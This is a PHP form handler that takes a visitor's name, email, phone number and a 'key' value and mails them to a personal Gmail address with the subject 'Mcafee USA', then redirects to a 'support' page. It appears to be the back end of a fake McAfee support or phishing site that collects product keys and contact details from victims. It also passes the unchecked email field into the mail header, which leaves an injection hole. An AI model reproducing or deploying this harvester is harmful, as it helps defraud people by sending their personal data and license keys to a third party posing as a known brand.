<?php
if($_POST){
    $name = $_POST['user_name'];
    $email = $_POST['user_email'];
    $phone = $_POST['user_phone'];
	$key = $_POST['user_key'];


	 $msg ="Name :$name\n";
     $msg.="Mob :$phone\n";
	 $msg.="Email :$email\n";
     $msg.="Key :$key\n\n";
        
         
   //$headers = "From: ${$email}\nReply-To: ${$email}";
//send email
    mail("vishranti.mehra@gmail.com", "Mcafee USA: $email", "$msg","From:$email");
	 echo '<script>  window.location.href = "mca-support.html";</script>';
}